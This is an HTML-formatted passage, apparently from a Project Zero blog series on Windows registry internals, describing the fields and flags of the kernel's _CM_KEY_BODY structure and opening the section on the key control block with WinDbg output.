 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x030&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x030&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;HandleTags&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;16,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x038&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Trans&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_TRANS_PTR&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x040&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KtmUow&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_GUID&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x048&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ContextListHead&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_LIST_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x058&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;EnumerationResumeContext&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Void&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x060&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;RestrictedAccessMask&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x064&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;LastSearchedIndex&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x068&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;LockedMemoryMdls&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Void&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Let&amp;#39;s quickly go over each field:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_hwtgc2it419p-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Type:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;for normal keys (i.e. almost all of them), this field is set to a magic value of 0x6B793032 (&amp;#39;ky02&amp;#39;). However, for predefined keys, this is the 32-bit value of the link&amp;#39;s target key with the highest bit set. This member is therefore used to distinguish between regular keys and predefined ones, for example in CmObReferenceObjectByHandle. Predefined keys have been now largely deprecated, but it is still possible to observe a non-standard Type value by opening a handle to one of the two last remaining ones: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Perflib\009 and CurrentLanguage under the same path.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;AccessCheckedLayerHeight:&lt;/span&gt;&lt;span&gt;&amp;nbsp;a new field added in November 2023 as part of the fix for &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451625&quot;&gt;CVE-2023-36404&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;. It is used for layered keys and contains the index of the lowest layer in the key stack that was access-checked when opening the key. It is later taken into account during other registry operations, in order to avoid leaking data from lower-layer, more restrictive keys that could have been created since the handle was opened.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KeyControlBlock:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;a pointer to the corresponding key control block.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;NotifyBlock:&lt;/span&gt;&lt;span&gt;&amp;nbsp;an optional pointer to the notify block associated with this handle. This is related to the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regnotifychangekeyvalue&quot;&gt;key notification functionality&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;in Windows and is described in more detail in the &amp;quot;Key notification structures&amp;quot; section below.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;ProcessID:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the PID of the process that created the handle. It doesn&amp;#39;t seem to serve any purpose in the kernel other than to be enumerable using the NtQueryOpenSubKeysEx system call (which requires SeRestorePrivilege, and is therefore available to administrators only).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KeyBodyList:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the list entry used to link all the key bodies within a single KCB together.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Flags:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;a set of flags concerning the specific key body. Here&amp;#39;s my interpretation of them based on reverse engineering:&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_hwtgc2it419p-1 start&quot;&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c0 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;KEY_BODY_HIVE_UNLOADED (0x1): indicates that the underlying hive of the key has been unloaded and is no longer active.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c0 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;KEY_BODY_DONT_RELOCK (0x2): this seems to be a short-term flag used to communicate between CmpCheckKeyBodyAccess/CmpCheckOpenAccessOnKeyBody and the nested CmpDoQueryKeyName routine, in order to indicate that the key&amp;#39;s KCB is already locked and shouldn&amp;#39;t be relocked again.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c0 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;KEY_BODY_DONT_DEINIT (0x4): if this flag is set, CmpDeleteKeyObject returns early and doesn&amp;#39;t proceed with the regular deinitialization of the key body object. However, it is unclear if/where the flag is set in the code, as I personally haven&amp;#39;t found any instances of it happening during my analysis.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c0 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;KEY_BODY_DELETED (0x8): indicates that the key has been deleted since the handle was opened, and it no longer exists.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c0 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;KEY_BODY_DONT_VIRTUALIZE (0x10): indicates that registry virtualization is disabled for this handle, as a result of opening the key with the (undocumented but present in SDK headers) REG_OPTION_DONT_VIRTUALIZE flag.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_hwtgc2it419p-0&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HandleTags:&lt;/span&gt;&lt;span&gt;&amp;nbsp;from the kernel perspective, this is simply a general purpose 16-bit storage that can be set by clients on a per-handle basis using NtSetInformationKey with the KeySetHandleTagsInformation information class, and queried with NtQueryKey and the KeyHandleTagsInformation information class. As far as I know, the kernel doesn&amp;#39;t dictate how this field should be used and leaves it up to the registry clients. In practice, it seems to be mostly used for purposes related to WOW64 and the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/winprog64/registry-redirector&quot;&gt;Registry Redirector&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;, storing flags such as KEY_WOW64_64KEY (0x100) and KEY_WOW64_32KEY (0x200), as well as some internal ones. The WOW64 functionality is implemented in KernelBase.dll, and functions such as ConstructKernelKeyPath and LocalBaseRegOpenKey are a good starting point for reverse engineering, if you&amp;#39;re curious to learn more. I have also observed the 0x1000 handle tag being set in the internal IopApplyMutableTagToRegistryKey kernel routine for keys such as HKLM\System\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000, but I&amp;#39;m unsure of its meaning.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Trans:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Indicates the transactional state of the handle. If the handle is not transacted (i.e. it wasn&amp;#39;t opened with one of &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeytransactedw&quot;&gt;RegOpenKeyTransacted&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeytransactedw&quot;&gt;RegCreateKeyTransacted&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;), it is set to zero. Otherwise, the lowest bit specifies the type of the transaction: 0 for KTM and 1 for lightweight transactions. The remaining bits form a pointer to the associated transaction object, either of the TmTransactionObjectType type (represented by the _KTRANSACTION structure), or of the CmRegistryTransactionType type (represented by a non-public structure that I&amp;#39;ve personally named _CM_LIGHTWEIGHT_TRANS_OBJECT).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KtmUow&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;if the handle is associated with a KTM transaction, this field stores the GUID that uniquely identifies it. For non-transacted and lightweight-transacted handles, the field is unused.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;ContextListHead:&lt;/span&gt;&lt;span&gt;&amp;nbsp;this is the head of the doubly-linked list of contexts that have been associated with the key body using the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmsetcallbackobjectcontext&quot;&gt;CmSetCallbackObjectContext&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;function. It is related to the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmregistercallbackex&quot;&gt;registry callbacks&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;functionality; see also the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-context-information&quot;&gt;Specifying Context Information&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;MSDN article for more details.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;EnumerationResumeContext:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;this is part of an optimization of the subkey enumeration process of layered keys (implemented in CmpEnumerateLayeredKey). Performing full enumeration of a layered key from scratch up to the given index is a very complex task, and repeating it over and over for each iteration of an enumeration loop would be very inefficient. The resume context helps address the problem for sequential enumeration by saving the intermediate state reached at an NtEnumerateKey call with a given index, and being able to resume from it when a request for index+1 comes next. It also has the added benefit of making it possible to stop and restart the enumeration process in the scope of a single system call, which is used to pause the operation and temporarily release some locks if the code detects that the registry is particularly congested. This happens at the intersection of the CmEnumerateKey and CmpEnumerateLayeredKey functions, with the latter potentially returning STATUS_RETRY and the former resuming the operation if such a situation arises.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;RestrictedAccessMask, LastSearchedIndex, LockedMemoryMdls:&lt;/span&gt;&lt;span&gt;&amp;nbsp;relatively new fields introduced in Windows 10 and 11, which I haven&amp;#39;t looked very deeply into and thus won&amp;#39;t discuss in detail here.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;After a key handle is translated into the corresponding _CM_KEY_BODY structure using the ObReferenceObjectByHandle(CmKeyObjectType) call, typically early in the execution of a registry-related system call, there are three primary operations that are usually performed. First, the kernel does a key status check by evaluating the expression &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c55&quot;&gt;KeyBody.Flags &amp;amp; 9&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;to determine if the key is associated with an unloaded hive (flag 0x1) or has been deleted (flag 0x8). This check is essential because most registry operations are only permitted on active, existing keys, and enforcing this condition is a fundamental step for guaranteeing registry state consistency. Second, the code accesses the KeyControlBlock pointer, which provides further access to the hive pointer (KCB.KeyHive), the key&amp;#39;s cell index (KCB.KeyCell), and other necessary fields and data structures required to perform any meaningful read/write actions on the key. Finally, the code checks the key body&amp;#39;s Trans/KtmUow members to determine if the handle is part of a transaction, and if so, the transaction is used as additional context for the action requested by the caller. Accesses to other members of the _CM_KEY_BODY structure are less frequent and serve more specialized purposes.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;tTszyzmaCA-c12&quot; id=&quot;h.ff4jg8silpk3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c16 tTszyzmaCA-c4&quot;&gt;Key control block&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;The key control block object can be thought of as the heart of the Windows kernel registry tree representation. It is effectively &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;descriptor of a single key in the system, and the second most important key-related object after the key node. It is always allocated from the kernel pool, and serves four main purposes:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_yglvxt1mgfm7-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Mirrors frequently used information from the key node to make it faster to access by the kernel code. This includes building an efficient, in-memory representation of the registry tree to optimize the traversal time when referring to registry paths.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Works as a single point of reference for all active handles to a specific key, and helps synchronize access to the key in the multithreaded Windows environment.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Represents any pending, transacted state of the registry key that has been introduced by a client, but not fully committed yet.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span&gt;Represents any complex relationships between registry keys that extend beyond the internal structure of the hive. The primary example are differencing hives, which are overlaid on top of each other, and whose corresponding keys form so-called &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;key stacks&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/04/the-windows-registry-adventure-2.html&quot;&gt;Blog post #2&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;in this series highlighted the dramatic growth of the registry codebase across successive Windows versions, illustrating the subsystem&amp;#39;s steady expansion over the last few decades. Similarly, the size of the Key Control Block (KCB) itself has nearly doubled in time, from 168 bytes in Windows XP x64 to 312 bytes in the latest Windows 11 release. This expansion underscores the increasing amount of information associated with every registry key, which the kernel must manage consistently and securely.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The KCB structure layout is present in the PDB symbols and can be displayed in WinDbg:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_KEY_CONTROL_BLOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;nt!_CM_KEY_CONTROL_BLOCK&lt;/span&gt;&lt;/p&gt;
